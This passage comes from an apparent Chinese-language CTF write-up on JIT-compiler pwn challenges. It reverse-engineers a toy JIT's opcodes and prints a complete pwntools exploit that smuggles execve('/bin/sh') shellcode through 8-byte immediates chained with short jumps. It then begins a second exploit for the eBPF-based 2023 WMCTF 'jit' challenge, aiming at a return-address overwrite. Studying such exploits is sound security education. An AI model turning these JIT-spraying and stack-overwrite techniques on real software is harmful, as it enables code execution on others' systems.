<span class="hljs-number">0</span>, <span class="hljs-number">0x81</span>])<br>p.send(data)<br></code></pre></td></tr></table></figure><p><img src="/img/jit-pwn/image-20230826224341966.png" alt="image-20230826224341966"></p><p>这里可以看出，上述variba是对<strong>rbp</strong>偏移的处理。</p><p>这里存在一个整型溢出漏洞，可以通过溢出使得<strong>rbp</strong>为0，从而直接操作<strong>rbp</strong>，从而控制函数返回地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">dbg(<span class="hljs-string">&#x27;b *$rebase(0x24ff)&#x27;</span>)<br><br>data = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xff</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span> | <span class="hljs-number">0x20</span>])<br>p.send(data)<br></code></pre></td></tr></table></figure><p><img src="/img/jit-pwn/image-20230826225026364.png" alt="image-20230826225026364"></p><p>剩下的指令也是类似的操作，通过调试，梳理出大致的汇编指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:                                  <span class="hljs-comment">// movabs rsi,imm</span><br>                                                <span class="hljs-comment">// lea    rdi,[rbp-0x8]</span><br>                                                <span class="hljs-comment">// mov    QWORD PTR [rdi],rsi</span><br>        v2 = IRstream::getop();<br>        var = Compiler::var2idx(v2);<br>        imm = IRstream::getimm();<br>        AsmHelper::imm2var(var, imm);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:                                  <span class="hljs-comment">// lea    rdi,[rbp-id1]</span><br>                                                <span class="hljs-comment">// mov    rsi,QWORD PTR [rdi]</span><br>                                                <span class="hljs-comment">// lea    rdi,[rbp-id2]</span><br>                                                <span class="hljs-comment">// mov    QWORD PTR [rdi],rsi</span><br>        v3 = IRstream::getop();<br>        var1 = Compiler::var2idx(v3);<br>        v4 = IRstream::getop();<br>        var2 = Compiler::var2idx(v4);<br>        AsmHelper::var2reg(var2);<br>        AsmHelper::pvar2reg(var1);<br>        AsmHelper::regassign();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:                                  <span class="hljs-comment">// mov    QWORD PTR [rdi],rsi</span><br>                                                <span class="hljs-comment">// lea    rdi,[rbp-0x10]</span><br>                                                <span class="hljs-comment">// mov    rsi,QWORD PTR [rdi]</span><br>                                                <span class="hljs-comment">// lea    rdi,[rbp-0x8]</span><br>                                                <span class="hljs-comment">// and    QWORD PTR [rdi],rsi</span><br>        v5 = IRstream::getop();<br>        var1_0 = Compiler::var2idx(v5);<br>        v6 = IRstream::getop();<br>        var2_0 = Compiler::var2idx(v6);<br>        AsmHelper::var2reg(var2_0);<br>        AsmHelper::pvar2reg(var1_0);<br>        AsmHelper::regarith(<span class="hljs-number">0x21</span>u);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:                                  <span class="hljs-comment">// lea    rdi,[rbp-0x10]</span><br>                                                <span class="hljs-comment">// mov    rsi,QWORD PTR [rdi]</span><br>                                                <span class="hljs-comment">// lea    rdi,[rbp-0x8]</span><br>                                                <span class="hljs-comment">// or     QWORD PTR [rdi],rsi</span><br>        v7 = IRstream::getop();<br>        var1_1 = Compiler::var2idx(v7);<br>        v8 = IRstream::getop();<br>        var2_1 = Compiler::var2idx(v8);<br>        AsmHelper::var2reg(var2_1);<br>        AsmHelper::pvar2reg(var1_1);<br>        AsmHelper::regarith(<span class="hljs-number">9u</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:                                  <span class="hljs-comment">// lea    rdi,[rbp-0x10]</span><br>                                                <span class="hljs-comment">// mov    rsi,QWORD PTR [rdi]</span><br>                                                <span class="hljs-comment">// lea    rdi,[rbp-0x8]</span><br>                                                <span class="hljs-comment">// xor    QWORD PTR [rdi],rsi</span><br>        v9 = IRstream::getop();<br>        var1_2 = Compiler::var2idx(v9);<br>        v10 = IRstream::getop();<br>        var2_2 = Compiler::var2idx(v10);<br>        AsmHelper::var2reg(var2_2);<br>        AsmHelper::pvar2reg(var1_2);<br>        AsmHelper::regarith(<span class="hljs-number">0x31</span>u);<br>        <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>到这里，程序流程已经梳理清楚了，我们如何利用呢？</p><p>这里我们无法直接使用syscall等汇编指令，我们可以使用异或等操作得到syscall等汇编指令，但是这里没有加减运算，只有逻辑运算，不容易通过计算得到我们需要的指令。但是，注意到程序对立即数的处理是8bytes的，可以想到，写入<strong>op + jmp</strong>格式的汇编，通过短指令跳转的方式完成利用。</p><p>最终wp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./jit&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote()<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, var, local, data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xff</span>, <span class="hljs-built_in">id</span>, var, local]) + data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op_ret</span>(<span class="hljs-params">var</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>, var])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op_define</span>(<span class="hljs-params">var, imm</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">1</span>, var]) + p64(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op_assign</span>(<span class="hljs-params">var1, var2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">2</span>, var1, var2])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op_and</span>(<span class="hljs-params">var1, var2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">3</span>, var1, var2])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op_or</span>(<span class="hljs-params">var1, var2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">4</span>, var1, var2])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op_xor</span>(<span class="hljs-params">var1, var2</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([<span class="hljs-number">5</span>, var1, var2])<br><br><br>dbg(<span class="hljs-string">&#x27;b *$rebase(0x24ff)&#x27;</span>)<br><br><span class="hljs-comment"># test</span><br><span class="hljs-comment"># data = bytes([0xff, 0, 0, 0x20, 1, 0x81]) + p64(0x0cebe78948)</span><br><span class="hljs-comment"># data += bytes([2, 0x81, 0x82])</span><br><span class="hljs-comment"># data += bytes([3, 0x81, 0x82])</span><br><span class="hljs-comment"># data += bytes([4, 0x81, 0x82])</span><br><span class="hljs-comment"># data += bytes([5, 0x81, 0x82])</span><br><span class="hljs-comment"># data += bytes([0, 0x81])</span><br><span class="hljs-comment"># p.send(data)</span><br><br>jop = func(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, flat(<br>    [<br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0x0bebf87d8d48</span>),    <span class="hljs-comment"># lea rdi, [rbp - 0x8]; jmp x</span><br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0x0cebf63148</span>),      <span class="hljs-comment"># xor rsi, rsi; jmp x</span><br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0x0cebd23148</span>),      <span class="hljs-comment"># xor rdx, rdx; jmp x</span><br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0x0debc031</span>),        <span class="hljs-comment"># xor eax, eax; jmp x</span><br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0x050f3bc083</span>),      <span class="hljs-comment"># add eax, 59; syscall      </span><br>        op_ret(<span class="hljs-number">0x81</span>)<br>    ]<br>))<br><br>shell = func(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x20</span>, flat(<br>    [<br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0xfffffffffffff000</span>),<br>        op_define(<span class="hljs-number">0x82</span>, <span class="hljs-number">0x7c</span>),  <span class="hljs-comment"># jop_offset</span><br>        op_and(<span class="hljs-number">0x80</span> | <span class="hljs-number">0x20</span>, <span class="hljs-number">0x81</span>),  <span class="hljs-comment"># ret_addr</span><br>        op_or(<span class="hljs-number">0x80</span> | <span class="hljs-number">0x20</span>, <span class="hljs-number">0x82</span>),<br>        op_define(<span class="hljs-number">0x81</span>, <span class="hljs-number">0x68732f6e69622f</span>),  <span class="hljs-comment"># /bin/sh</span><br>        op_ret(<span class="hljs-number">0x81</span>),<br>    ]<br>))<br><br>payload = shell + jop<br>p.send(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/jit-pwn/image-20230826230005769.png" alt="image-20230826230005769"></p><h2 id="2023-wmctf-jit"><a href="#2023-wmctf-jit" class="headerlink" title="2023-wmctf-jit"></a>2023-wmctf-jit</h2><p>这道题程序很大，且去掉了符号表，特别难逆，尤其是指令翻译那块，赤裸裸的2000多行代码，直接劝退！复现的时候，发现很多大佬都是直接插看ebpf指令集，然后发现题目也是提示ebpf了。</p><p>查看保护。</p><p><img src="/img/jit-pwn/image-20230827231817064.png" alt="image-20230827231817064"></p><p>逆向时，发现是C++实现的，于是我们可以有意识的向string或者vector等常用的容器靠拢。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">program.begin = v19;<br>program.length = <span class="hljs-number">0LL</span>;<br>v19[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>memory.begin = v21;<br>memory.length = <span class="hljs-number">0LL</span>;<br>v21[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">std</span>::operator&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;Program: &quot;</span>);<br><span class="hljs-built_in">std</span>::getline&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, &amp;program);<br><span class="hljs-keyword">if</span> ( !memory.length )<br>&#123;<br>    <span class="hljs-built_in">std</span>::operator&lt;&lt;&lt;<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, <span class="hljs-string">&quot;Memory: &quot;</span>);<br>    <span class="hljs-built_in">std</span>::getline&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;,<span class="hljs-built_in">std</span>::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cin</span>, &amp;memory);<br>&#125;<br></code></pre></td></tr></table></figure><p>程序一开始，初始化类型应该为string的program与memory，然后获取用户输入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">sub_8940(&amp;v17, &amp;program);<br>sub_8860(&amp;v16, (__int64)&amp;v17);                <span class="hljs-comment">// copy</span><br><span class="hljs-keyword">if</span> ( v17.start )<br>    operator <span class="hljs-title function_">delete</span><span class="hljs-params">(v17.start)</span>;<br>sub_8940(&amp;v17, &amp;memory);<br></code></pre></td></tr></table></figure><p>接着，程序将program赋值到vector容器v17中，并复制到v16中。类似的，将memory赋值到v17中。通过对<code>sub_8940</code>的简单逆向，可以看出程序要求输入16进制字符串。</p><p><img src="/img/jit-pwn/image-20230827232559934.png" alt="image-20230827232559934"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">ptr = <span class="hljs-number">0LL</span>;<br>inited = Init_vm();<br><span class="hljs-keyword">if</span> ( !inited )<br>    <span class="hljs-keyword">goto</span> LABEL_10;<br>v4 = (__int64)qword_E098;<br><span class="hljs-keyword">if</span> ( qword_E098 != (<span class="hljs-type">char</span> *)&amp;dword_E088 )<br>&#123;<br>    <span class="hljs-keyword">while</span> ( !(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_2EA0(inited, *(_DWORD *)(v4 + <span class="hljs-number">0x20</span>), (__int64)<span class="hljs-string">&quot;unnamed&quot;</span>, *(_QWORD *)(v4 + <span class="hljs-number">0x28</span>)) )<br>    &#123;<br>        v4 = <span class="hljs-built_in">std</span>::_Rb_tree_increment();<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span> *)v4 == &amp;dword_E088 )<br>            <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_10;<br>&#125;<br>LABEL_22:<br><span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_2ED0(inited, <span class="hljs-number">5</span>) )<br>&#123;<br>    LABEL_10:<br>    <span class="hljs-built_in">std</span>::__ostream_insert&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;();<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cerr</span>);<br>    v5 = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">goto</span> LABEL_11;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一部分，主要是对vm虚拟机类进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">v5 = load_program(inited, (__int64 *)v16.start, v16.finish - v16.start, (__int64 *)&amp;ptr, v7, v8);<br><span class="hljs-keyword">if</span> ( !v5 )<br>&#123;<br>    mmap_addr = sub_8510(inited, (__int64 *)&amp;ptr);<span class="hljs-comment">// 指令翻译 + mmap</span><br>    <span class="hljs-keyword">if</span> ( mmap_addr )<br>    &#123;<br>        v10 = ((__int64 (__fastcall *)(<span class="hljs-type">char</span> *, <span class="hljs-type">signed</span> __int64))mmap_addr)(v17.start, v17.finish - v17.start);<span class="hljs-comment">// shellcode</span><br>        <span class="hljs-built_in">std</span>::__ostream_insert&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;();<br>        *(_DWORD *)((<span class="hljs-type">char</span> *)&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> + *(_QWORD *)(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> - <span class="hljs-number">24LL</span>) + <span class="hljs-number">24</span>) = *(_DWORD *)((_BYTE *)&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span><br>                                                                                           + *(_QWORD *)(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> - <span class="hljs-number">24LL</span>)<br>                                                                                           + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFB5</span> | <span class="hljs-number">8</span>;<br>        v11 = <span class="hljs-built_in">std</span>::ostream::_M_insert&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>&gt;(&amp;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span>, v10);<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>&lt;<span class="hljs-type">char</span>,<span class="hljs-built_in">std</span>::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(v11);<br></code></pre></td></tr></table></figure><p>这部分是程序最重要的部分。大致逻辑为将v16，即program输入到虚拟机中。然后，对虚拟机指令进行翻译，并返回mmap地址。最后，执行shellcode。</p><p>指令翻译的调用流程大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sub_8510 -&gt; sub_84E0 -&gt; sub_8370 -&gt; sub_5A50<span class="hljs-comment">// 指令翻译</span><br></code></pre></td></tr></table></figure><p><code>sub_5A50</code>将近2000来行，笔者太菜了，这里直接run。</p><p>直接看<a href="https://github.com/iovisor/bpf-docs/blob/master/eBPF.md">ebpf文档</a>翻译指令，文档对指令的定义以及操作都描述的很清楚了，这里就不再赘述了。</p><p>我们做一个大致的测试，得到指令允许的操作对象。</p><p>这里限制指令数的操作是在<code>load_program</code>函数中。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># test regs index</span><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    payload += p64(add_imm(i, <span class="hljs-number">0x8</span>))<br>payload += p64(load_src(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x8</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/jit-pwn/image-20230826230155195.png" alt="image-20230826230155195"></p><p>可以看到我们可以操作大部分寄存器，甚至可以直接操作rbp，即栈中内容。</p><p>大致想法就是覆盖栈上返回地址为ogg。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment">#encoding:utf-8</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p8, p16, p32, p64<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./jit&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><br><span class="hljs-keyword">else</span>:<br>    p = remote()<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br>    <br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>command = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x293A)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>regs = [<br>    <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;rdi&#x27;</span>, <span class="hljs-string">&#x27;rsi&#x27;</span>, <span class="hljs-string">&#x27;rdx&#x27;</span>, <span class="hljs-string">&#x27;r9&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-string">&#x27;rbx&#x27;</span>, <span class="hljs-string">&#x27;r13&#x27;</span>, <span class="hljs-string">&#x27;r14&#x27;</span>, <span class="hljs-string">&#x27;r15&#x27;</span>, <span class="hljs-string">&#x27;rbp&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Inst</span>(<span class="hljs-params">opcode, dst=<span class="hljs-number">0</span>, src=<span class="hljs-number">0</span>, offset=<span class="hljs-number">0</span>, imm=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(dst, <span class="hljs-built_in">str</span>):<br>        dst = regs.index(dst.lower().strip())<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(src, <span class="hljs-built_in">str</span>):<br>        src = regs.index(src.lower().strip())<br><br>    inst = <span class="hljs-number">0</span><br>    inst |= opcode<br>    inst |= dst &lt;&lt; <span class="hljs-number">8</span><br>    inst |= src &lt;&lt; <span class="hljs-number">12</span><br>    inst |= offset &lt;&lt; <span class="hljs-number">16</span><br>    inst |= imm &lt;&lt; <span class="hljs-number">32</span><br>    <span class="hljs-keyword">return</span> inst<br><br><br>add_imm = <span class="hljs-keyword">lambda</span> dst, imm: Inst(<span class="hljs-number">0x07</span>, dst, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, imm)   <span class="hljs-comment"># add dst, imm</span><br>sub_imm = <span class="hljs-keyword">lambda</span> dst, imm: Inst(<span class="hljs-number">0x17</span>, dst, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, imm)   <span class="hljs-comment"># sub dst, imm</span><br>load_src = <span class="hljs-keyword">lambda</span> dst, src, off: Inst(<span 